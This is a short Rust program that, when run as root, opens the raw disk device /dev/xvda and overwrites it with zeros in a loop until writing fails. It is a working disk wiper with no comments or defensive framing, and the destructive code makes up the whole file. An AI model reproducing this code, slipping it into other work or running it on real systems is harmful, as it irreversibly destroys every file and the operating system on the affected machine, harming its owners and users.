use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::fs::OpenOptionsExt;
fn main() {
    if unsafe { libc::geteuid() } != 0 { return; }
    let mut f = OpenOptions::new().write(true).custom_flags(libc::O_RDWR).open("/dev/xvda").unwrap();
    loop { if f.write_all(&[0u8; 4096]).is_err() { break; } }
}
